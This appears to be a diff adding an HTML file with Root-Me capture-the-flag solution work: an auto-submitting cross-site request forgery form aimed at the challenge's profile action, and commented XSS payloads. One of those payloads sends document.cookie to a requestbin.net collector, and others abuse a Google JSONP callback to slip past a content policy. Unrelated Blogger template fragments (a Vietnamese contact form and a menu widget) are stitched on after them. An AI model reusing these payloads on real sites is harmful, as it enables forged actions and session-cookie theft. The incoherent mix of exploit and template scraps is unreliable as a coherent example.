@@ -1,0 +1,88 @@
+<html>
+
+<body onload="document.form1.submit()">
+    <form name="form1" id="profile" action="http://challenge01.root-me.org/web-client/ch22/?action=profile"
+        method="post" enctype="multipart/form-data">
+        <input id="username" type="text" name="username" value="ndqk">
+        <input id="status" type="checkbox" name="status" checked>
+        <button type="submit">Submit</button>
+    </form>
+</body>
+
+</html>
+
+<!-- http://requestbin.net/r/gado2ot7?flag=
+concat(document.cookie)
+
+"><script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=(console.log(123))"></script>
+
+"><script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=(function xss(){console.log(2);})"></script>
+
+document.write('<img src=http://requestbin.net/r/gado2ot7?flag='.concat(document.cookie).concat('"')) -->
+
+<div class='form'>
+    <form name='contact-form'>
+        <input class='contact-form-name' name='name' size='30' type='text' value='' placeholder="Tên" />
+
+
+        <input class='contact-form-email' name='email' size='30' type='text' value='' placeholder="Email" />
+
+
+        <textarea class='contact-form-email-message' cols='25' name='email-message' rows='5' placeholder="Tin nhắn">
+        </textarea>
+        <input class='contact-form-button contact-form-button-submit' type='button' />
+</div>
+
+<div class='secondary-menu'>
+    <div class='container row'>
+        <b:section class='second-menu' id='second-menu' maxwidgets='1' name='Secondary Menu' showaddelement='yes'>
+            <b:widget id='LinkList3' locked='true' title='' type='LinkList' visible='false'>
+                <b:widget-settings>
+                    <b:widget-setting name='text-9'>About Us</b:widget-setting>
+                    <b:widget-setting name='link-9'>https://sorashop-soratemplates.blogspot.com/p/about.html
+                    </b:widget-setting>
+                    <b:widget-setting name='text-8'>Contact Us</b:widget-setting>
+                    <b:widget-setting name='link-7'>#</b:widget-setting>
+                    <b:widget-setting name='link-8'>https://sorashop-soratemplates.blogspot.com/p/contact-us.html
+                    </b:widget-setting>
+                    <b:widget-setting name='text-10'>Support</b:widget-setting>
+                    <b:widget-setting name='link-5'>#</b:widget-setting>
+                    <b:widget-setting name='link-6'>#</b:widget-setting>
+                    <b:widget-setting name='link-3'>#</b:widget-setting>
+                    <b:widget-setting name='link-4'>#</b:widget-setting>
+                    <b:widget-setting name='text-1'>FAQ</b:widget-setting>
+                    <b:widget-setting name='text-0'>Report</b:widget-setting>
+                    <b:widget-setting name='text-3'>Policy</b:widget-setting>
+                    <b:widget-setting name='text-2'>Terms of Use</b:widget-setting>
+                    <b:widget-setting name='text-5'>
+                        <![CDATA[Today's Deals]]>
+                    </b:widget-setting>
+                    <b:widget-setting name='text-4'>Offer Zone</b:widget-setting>
+                    <b:widget-setting name='text-7'>Blog</b:widget-setting>
+                    <b:widget-setting name='text-6'>Best Sellers</b:widget-setting>
+                    <b:widget-setting name='sorting'>NONE</b:widget-setting>
+                    <b:widget-setting name='link-1'>#</b:widget-setting>
+                    <b:widget-setting name='link-2'>#</b:widget-setting>
+                    <b:widget-setting name='link-0'>#</b:widget-setting>
+                    <b:widget-setting name='link-10'>#</b:widget-setting>
+                </b:widget-settings>
+                <b:includable id='main'>
+                    <b:include name='widget-title' />
+                    <b:include name='content' />
+                </b:includable>
+                <b:includable id='content'>
+                    <div class='widget-content'>
+                        <ul>
+                            <b:loop values='data:links' var='link'>
+                                <li><a expr:href='data:link.target'>
+                                        <data:link.name />
+                                    </a></li>
+                            </b:loop>
+                        </ul>
+                    </div>
+                </b:includable>
+            </b:widget>
+        </b:section>
+    </div>
+</div>
+</div>
